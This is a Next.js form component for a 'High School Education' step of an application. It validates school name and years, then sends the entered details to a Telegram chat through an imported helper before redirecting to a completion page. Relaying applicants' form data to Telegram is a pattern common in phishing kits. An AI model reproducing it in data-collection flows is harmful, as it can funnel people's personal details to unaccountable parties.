"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

import { sendTelegramMessage } from "../../../utils/telegram";

const EducationHistoryForm = () => {
  const [formData, setFormData] = useState({
    institution: "",
    startYear: "",
    endYear: "",
    gpa: "",
    honors: ""
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.institution.trim()) newErrors.institution = "High school name is required";
    if (!formData.startYear) newErrors.startYear = "Start year is required";
    if (!formData.endYear) newErrors.endYear = "End year is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    const message = `High School Education Submission:
      - High School: ${formData.institution}
      - Years: ${formData.startYear} - ${formData.endYear}
      - GPA: ${formData.gpa || 'N/A'}
      - Honors: ${formData.honors || 'N/A'}
      - Submitted at: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      router.push("/complete");
    } catch (error) {
      console.error("Submission error:", error);
      alert("Error submitting form. Please try again.");
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">High School Education</h1>
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">High School Name</label>
              <input
                value={formData.institution}
                onChange={(e) => setFormData({...formData, institution: e.target.value})}
                className={`w-full mt-2 border ${errors.institution ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.institution && <p className="text-red-500 text-sm mt-1">{errors.institution}</p>}
            </div>

            <div className="grid grid-cols-2 gap-6 mb-6">
              <div>
                <label className="block text-sm font-medium text-black">Start Year</label>
                <select
                  value={formData.startYear}
                  onChange={(e) => setFormData({...formData, startYear: e.target.value})}
                  className={`w-full mt-2 border ${errors.startYear ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                >
                  <option value="">Year</option>
                  {Array.from({length: 50}, (_, i) => new Date().getFullYear() - i).map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
                {errors.startYear && <p className="text-red-500 text-sm mt-1">{errors.startYear}</p>}
              </div>

              <div>
                <label className="block text-sm font-medium text-black">End Year</label>
                <select
                  value={formData.endYear}
                  onChange={(e) => setFormData({...formData, endYear: e.target.value})}
                  className={`w-full mt-2 border ${errors.endYear ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                >
                  <option value="">Year</option>
                  {Array.from({length: 50}, (_, i) => new Date().getFullYear() - i).map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
                {errors.endYear && <p className="text-red-500 text-sm mt-1">{errors.endYear}</p>}
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">GPA (Optional)</label>
              <input
                type="number"
                step="0.1"
                min="0"
                max="4"
                value={formData.gpa}
                onChange={(e) => setFormData({...formData, gpa: e.target.value})}
                className="w-full mt-2 border border-gray-300 rounded-lg p-3"
              />
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Honors/Awards (Optional)</label>
              <textarea
                value={formData.honors}
                onChange={(e) => setFormData({...formData, honors: e.target.value})}
                className="w-full mt-2 border border-gray-300 rounded-lg p-3 h-32"
              />
            </div>

            <button type="submit" className="w-full bg-green-500 text-white p-4 rounded-xl hover:bg-green-600">
              Complete Application
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default EducationHistoryForm;
